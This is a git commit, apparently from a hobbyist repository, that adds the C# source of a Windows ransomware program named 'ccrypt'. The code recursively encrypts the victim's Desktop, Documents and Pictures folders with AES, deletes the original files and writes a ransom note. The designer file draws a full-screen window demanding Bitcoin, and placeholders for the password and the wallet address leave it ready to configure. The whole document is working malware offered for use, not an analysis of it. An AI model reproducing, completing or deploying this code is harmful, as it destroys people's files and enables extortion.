f9aaaa35c75da6702cf960261ca0002ad4d2a2cb
RookieThaGawd <90254001+9xc@users.noreply.github.com>
2021-09-30 17:07:26 +0200

    Add files via upload

---
+++ ccrypt/Form1.Designer.cs
@@ -0,0 +1,182 @@
+﻿
+namespace ccrypt
+{
+    partial class payload
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(payload));
+            this.pictureBox1 = new System.Windows.Forms.PictureBox();
+            this.siticoneTransparentDrag1 = new Siticone.UI.WinForms.SiticoneTransparentDrag();
+            this.label3 = new System.Windows.Forms.Label();
+            this.lblBitcoinAmount = new System.Windows.Forms.Label();
+            this.lblCount = new System.Windows.Forms.Label();
+            this.txtBitcoinAddress = new Siticone.UI.WinForms.SiticoneTextBox();
+            this.copybtn = new Siticone.UI.WinForms.SiticoneButton();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // pictureBox1
+            // 
+            this.pictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox1.Image")));
+            this.pictureBox1.Location = new System.Drawing.Point(216, -62);
+            this.pictureBox1.Name = "pictureBox1";
+            this.pictureBox1.Size = new System.Drawing.Size(310, 243);
+            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
+            this.pictureBox1.TabIndex = 0;
+            this.pictureBox1.TabStop = false;
+            // 
+            // siticoneTransparentDrag1
+            // 
+            this.siticoneTransparentDrag1.DragEndTransparencyValue = 1D;
+            this.siticoneTransparentDrag1.DragStartTransparencyValue = 0.9D;
+            this.siticoneTransparentDrag1.TargetDragControl = this;
+            // 
+            // label3
+            // 
+            this.label3.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
+            | System.Windows.Forms.AnchorStyles.Right)));
+            this.label3.Font = new System.Drawing.Font("Microsoft Sans Serif", 27.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label3.ForeColor = System.Drawing.Color.White;
+            this.label3.Location = new System.Drawing.Point(-89, 158);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(914, 58);
+            this.label3.TabIndex = 11;
+            this.label3.Text = "In order to recover your data...";
+            this.label3.TextAlign = System.Drawing.ContentAlignment.TopCenter;
+            // 
+            // lblBitcoinAmount
+            // 
+            this.lblBitcoinAmount.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
+            | System.Windows.Forms.AnchorStyles.Right)));
+            this.lblBitcoinAmount.Font = new System.Drawing.Font("Microsoft Sans Serif", 20.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.lblBitcoinAmount.ForeColor = System.Drawing.Color.White;
+            this.lblBitcoinAmount.Location = new System.Drawing.Point(-79, 212);
+            this.lblBitcoinAmount.Name = "lblBitcoinAmount";
+            this.lblBitcoinAmount.Size = new System.Drawing.Size(906, 55);
+            this.lblBitcoinAmount.TabIndex = 7;
+            this.lblBitcoinAmount.Text = "Send Exactly 0.00639 BTC To The BTC Address Below";
+            this.lblBitcoinAmount.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
+            // 
+            // lblCount
+            // 
+            this.lblCount.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
+            | System.Windows.Forms.AnchorStyles.Right)));
+            this.lblCount.Font = new System.Drawing.Font("Microsoft Sans Serif", 26.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.lblCount.ForeColor = System.Drawing.Color.White;
+            this.lblCount.Location = new System.Drawing.Point(-81, 97);
+            this.lblCount.Name = "lblCount";
+            this.lblCount.Size = new System.Drawing.Size(914, 55);
+            this.lblCount.TabIndex = 6;
+            this.lblCount.Text = "Your files (count: n) have been encrypted!";
+            this.lblCount.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
+            // 
+            // txtBitcoinAddress
+            // 
+            this.txtBitcoinAddress.BackColor = System.Drawing.Color.DimGray;
+            this.txtBitcoinAddress.BorderColor = System.Drawing.Color.Crimson;
+            this.txtBitcoinAddress.BorderRadius = 2;
+            this.txtBitcoinAddress.Cursor = System.Windows.Forms.Cursors.IBeam;
+            this.txtBitcoinAddress.DefaultText = "YOUR BTC ADDRESS";
+            this.txtBitcoinAddress.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
+            this.txtBitcoinAddress.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
+            this.txtBitcoinAddress.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
+            this.txtBitcoinAddress.DisabledState.Parent = this.txtBitcoinAddress;
+            this.txtBitcoinAddress.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
+            this.txtBitcoinAddress.FillColor = System.Drawing.Color.DimGray;
+            this.txtBitcoinAddress.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
+            this.txtBitcoinAddress.FocusedState.Parent = this.txtBitcoinAddress;
+            this.txtBitcoinAddress.ForeColor = System.Drawing.Color.White;
+            this.txtBitcoinAddress.HoveredState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
+            this.txtBitcoinAddress.HoveredState.Parent = this.txtBitcoinAddress;
+            this.txtBitcoinAddress.Location = new System.Drawing.Point(25, 291);
+            this.txtBitcoinAddress.Name = "txtBitcoinAddress";
+            this.txtBitcoinAddress.PasswordChar = '\0';
+            this.txtBitcoinAddress.PlaceholderText = "";
+            this.txtBitcoinAddress.SelectedText = "";
+            this.txtBitcoinAddress.ShadowDecoration.Parent = this.txtBitcoinAddress;
+            this.txtBitcoinAddress.Size = new System.Drawing.Size(480, 36);
+            this.txtBitcoinAddress.TabIndex = 13;
+            this.txtBitcoinAddress.TextChanged += new System.EventHandler(this.txtBitcoinAddress_TextChanged);
+            // 
+            // copybtn
+            // 
+            this.copybtn.BorderColor = System.Drawing.Color.Crimson;
+            this.copybtn.BorderRadius = 2;
+            this.copybtn.BorderThickness = 1;
+            this.copybtn.CheckedState.Parent = this.copybtn;
+            this.copybtn.CustomImages.Parent = this.copybtn;
+            this.copybtn.FillColor = System.Drawing.Color.DimGray;
+            this.copybtn.Font = new System.Drawing.Font("Segoe UI", 14.25F, System.Drawing.FontStyle.Bold);
+            this.copybtn.ForeColor = System.Drawing.Color.White;
+            this.copybtn.HoveredState.Parent = this.copybtn;
+            this.copybtn.Location = new System.Drawing.Point(519, 291);
+            this.copybtn.Name = "copybtn";
+            this.copybtn.ShadowDecoration.Parent = this.copybtn;
+            this.copybtn.Size = new System.Drawing.Size(206, 36);
+            this.copybtn.TabIndex = 14;
+            this.copybtn.Text = "Copy";
+            this.copybtn.Click += new System.EventHandler(this.copybtn_Click);
+            // 
+            // payload
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.Color.DimGray;
+            this.ClientSize = new System.Drawing.Size(753, 356);
+            this.Controls.Add(this.copybtn);
+            this.Controls.Add(this.txtBitcoinAddress);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.lblBitcoinAmount);
+            this.Controls.Add(this.lblCount);
+            this.Controls.Add(this.pictureBox1);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            this.MaximizeBox = false;
+            this.MinimizeBox = false;
+            this.Name = "payload";
+            this.ShowIcon = false;
+            this.ShowInTaskbar = false;
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "payload";
+            this.Load += new System.EventHandler(this.payload_Load);
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.PictureBox pictureBox1;
+        private Siticone.UI.WinForms.SiticoneTransparentDrag siticoneTransparentDrag1;
+        private Siticone.UI.WinForms.SiticoneButton copybtn;
+        private Siticone.UI.WinForms.SiticoneTextBox txtBitcoinAddress;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.Label lblBitcoinAmount;
+        private System.Windows.Forms.Label lblCount;
+    }
+}
+
---
+++ ccrypt/Form1.cs
@@ -0,0 +1,256 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.IO;
+using System.Security.Cryptography;
+
+namespace ccrypt
+{
+    public partial class payload : Form
+    {
+        private const bool DELETE_ALL_ORIGINALS = true;
+        private const bool ENCRYPT_DESKTOP = true;
+        private const bool ENCRYPT_DOCUMENTS = true;
+        private const bool ENCRYPT_PICTURES = true;
+        private const string ENCRYPTED_FILE_EXTENSION = ".ccrypt";
+        private const string ENCRYPT_PASSWORD = "YOURPWOFCHOICE";
+        private const string BITCOIN_ADDRESS = "yourbtcaddress";
+        private const string BITCOIN_RANSOM_AMOUNT = "0.00639";
+
+
+
+
+        private static string ENCRYPTION_LOG = "";
+        private string RANSOM_LETTER =
+           "All of your files have been encrypted.\n\n" +
+           "To unlock them, please send " + BITCOIN_RANSOM_AMOUNT + " bitcoin(s) to BTC address: " + BITCOIN_ADDRESS + "\n" +
+           "Or else your files are lost!\n\n" +
+           "Encryption Log:\n" +
+           "----------------------------------------\n";
+        private string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
+        private string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+        private string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
+        private static int encryptedFileCount = 0;
+
+        public payload()
+        {
+            InitializeComponent();
+        }
+
+        private void copybtn_Click(object sender, EventArgs e)
+        {
+            Clipboard.SetText(txtBitcoinAddress.Text);
+        }
+
+        private void txtBitcoinAddress_TextChanged(object sender, EventArgs e)
+        {
+            txtBitcoinAddress.Enabled = false;
+        }
+
+        private void payload_Load(object sender, EventArgs e)
+        {
+            if (ENCRYPT_DESKTOP)
+            {
+                encryptFolderContents(DESKTOP_FOLDER);
+            }
+
+            if (ENCRYPT_PICTURES)
+            {
+                encryptFolderContents(PICTURES_FOLDER);
+            }
+
+            if (ENCRYPT_DOCUMENTS)
+            {
+                encryptFolderContents(DOCUMENTS_FOLDER);
+            }
+
+            if (encryptedFileCount > 0)
+            {
+                formatFormPostEncryption();
+                dropRansomLetter();
+            }
+            else
+            {
+                Console.Out.WriteLine("No files to encrypt.");
+                Application.Exit();
+            }
+        }
+        private void dropRansomLetter()
+        {
+            StreamWriter ransomWriter = new StreamWriter(DESKTOP_FOLDER + @"\___RECOVER__FILES__" + ENCRYPTED_FILE_EXTENSION + ".txt");
+            ransomWriter.WriteLine(RANSOM_LETTER);
+            ransomWriter.WriteLine(ENCRYPTION_LOG);
+            ransomWriter.Close();
+        }
+
+        private void formatFormPostEncryption()
+        {
+            this.Opacity = 100;
+            this.WindowState = FormWindowState.Maximized;
+            lblCount.Text = "Your files (count: " + encryptedFileCount + ") have been encrypted!";
+        }
+
+        private void initializeForm()
+        {
+            this.Opacity = 0;
+            this.ShowInTaskbar = false;
+            lblBitcoinAmount.Text = "Please send " + BITCOIN_RANSOM_AMOUNT + " Bitcoin(s) to the following BTC address:";
+            txtBitcoinAddress.Text = BITCOIN_ADDRESS;
+            lblBitcoinAmount.Focus();
+        }
+
+        static void encryptFolderContents(string sDir)
+        {
+            try
+            {
+                foreach (string f in Directory.GetFiles(sDir))
+                {
+                    if (!f.Contains(ENCRYPTED_FILE_EXTENSION))
+                    {
+                        Console.Out.WriteLine("Encrypting: " + f);
+                        FileEncrypt(f, ENCRYPT_PASSWORD);
+                    }
+                }
+
+                foreach (string d in Directory.GetDirectories(sDir))
+                {
+                    encryptFolderContents(d);
+                }
+            }
+            catch (System.Exception excpt)
+            {
+                Console.WriteLine(excpt.Message);
+            }
+        }
+
+        private static void FileEncrypt(string inputFile, string password)
+        {
+            byte[] salt = GenerateRandomSalt();
+
+            FileStream fsCrypt = new FileStream(inputFile + ENCRYPTED_FILE_EXTENSION, FileMode.Create);
+
+            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
+
+            RijndaelManaged AES = new RijndaelManaged();
+            AES.KeySize = 256;
+            AES.BlockSize = 128;
+            AES.Padding = PaddingMode.PKCS7;
+
+            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
+            AES.Key = key.GetBytes(AES.KeySize / 8);
+            AES.IV = key.GetBytes(AES.BlockSize / 8);
+
+            AES.Mode = CipherMode.CBC;
+
+            fsCrypt.Write(salt, 0, salt.Length);
+
+            CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write);
+
+            FileStream fsIn = new FileStream(inputFile, FileMode.Open);
+
+            byte[] buffer = new byte[1048576];
+            int read;
+
+            try
+            {
+                while ((read = fsIn.Read(buffer, 0, buffer.Length)) > 0)
+                {
+                    cs.Write(buffer, 0, read);
+                }
+
+                fsIn.Close();
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error: " + ex.Message);
+            }
+            finally
+            {
+                ENCRYPTION_LOG += inputFile + "\n";
+                encryptedFileCount++;
+                cs.Close();
+                fsCrypt.Close();
+                if (DELETE_ALL_ORIGINALS)
+                {
+                    File.Delete(inputFile);
+                }
+            }
+        }
+
+        private static void FileDecrypt(string inputFile, string outputFile, string password)
+        {
+            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);
+            byte[] salt = new byte[32];
+
+            FileStream cryptoFileStream = new FileStream(inputFile, FileMode.Open);
+            cryptoFileStream.Read(salt, 0, salt.Length);
+
+            RijndaelManaged AES = new RijndaelManaged();
+            AES.KeySize = 256;
+            AES.BlockSize = 128;
+            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
+            AES.Key = key.GetBytes(AES.KeySize / 8);
+            AES.IV = key.GetBytes(AES.BlockSize / 8);
+            AES.Padding = PaddingMode.PKCS7;
+            AES.Mode = CipherMode.CBC;
+
+            CryptoStream cryptoStream = new CryptoStream(cryptoFileStream, AES.CreateDecryptor(), CryptoStreamMode.Read);
+
+            FileStream fileStreamOutput = new FileStream(outputFile, FileMode.Create);
+
+            int read;
+            byte[] buffer = new byte[1048576];
+
+            try
+            {
+                while ((read = cryptoStream.Read(buffer, 0, buffer.Length)) > 0)
+                {
+                    fileStreamOutput.Write(buffer, 0, read);
+                }
+            }
+            catch (CryptographicException ex_CryptographicException)
+            {
+                Console.WriteLine("CryptographicException error: " + ex_CryptographicException.Message);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error: " + ex.Message);
+            }
+
+            try
+            {
+                cryptoStream.Close();
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error by closing CryptoStream: " + ex.Message);
+            }
+            finally
+            {
+                fileStreamOutput.Close();
+                cryptoFileStream.Close();
+            }
+        }
+
+        public static byte[] GenerateRandomSalt()
+        {
+            byte[] data = new byte[32];
+
+            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
+            {
+                for (int i = 0; i < 10; i++)
+                {
+                    rng.GetBytes(data);
+                }
+            }
+
+            return data;
+        }
+    }
+}
